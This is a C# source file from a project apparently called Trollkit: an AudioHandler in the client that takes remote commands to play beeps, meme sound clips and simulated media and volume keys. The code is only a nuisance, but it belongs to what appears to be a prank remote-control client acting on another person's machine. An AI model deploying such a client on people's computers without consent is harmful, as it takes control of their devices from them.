using System;
using System.Collections.Generic;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Interop;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;

namespace Trollkit_Client.Modules.CommandHandlers
{
	public class AudioHandler : ICommandHandler
	{
		[DllImport("user32.dll")]
		static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, IntPtr dwExtraInfo);

		private const int KEYEVENTF_EXTENTEDKEY = 1;
		private const int KEYEVENTF_KEYUP = 0;
		private const int NEXT_TRACK = 0xB0;
		private const int PLAY_PAUSE = 0xB3;
		private const int PREV_TRACK = 0xB1;
		private const int VOLUME_MUTE = 0x80000;
		private const int VOLUME_UP = 0xA0000;
		private const int VOLUME_DOWN = 0x90000;
		public bool HandleCommand(TransferCommandObject obj)
		{

			if (obj.Command == "PlayBeep")
			{
				string[] values = obj.Value.Split(',');

				if (values.Length == 2)
				{
					Console.Beep(int.Parse(values[0]), int.Parse(values[1]));
				}
				else
				{
					Console.Beep(500, 500);
				}

				return true;
			}
			else if (obj.Command == "Jeff")
			{
				SoundPlayer sndplayr = new SoundPlayer(Properties.Resources.MyNameIsJeff);
				sndplayr.Play();
				return true;
			}
			else if (obj.Command == "WesselMove")
			{
				SoundPlayer sndplayr = new SoundPlayer(Properties.Resources.EchtEenWesselSample);
				sndplayr.Play();
				return true;
			}
			else if (obj.Command == "VolumeUp")
			{
				keybd_event((byte)Keys.VolumeUp, 0, 0, IntPtr.Zero);
				return true;
			}
			else if (obj.Command == "VolumeDown")
			{
				keybd_event((byte)Keys.VolumeDown, 0, 0, IntPtr.Zero);
				return true;
			}
			else if (obj.Command == "Play_Pause")
			{
				keybd_event(PLAY_PAUSE, 0, KEYEVENTF_EXTENTEDKEY, IntPtr.Zero);
				return true;
			}
			else if (obj.Command == "NextTrack")
			{
				keybd_event(NEXT_TRACK, 0, KEYEVENTF_EXTENTEDKEY, IntPtr.Zero);
				return true;
			}
			else if (obj.Command == "PreviousTrack")
			{
				keybd_event(PREV_TRACK, 0, KEYEVENTF_EXTENTEDKEY, IntPtr.Zero);
				return true;
			}

			return false;
		}

	}
}
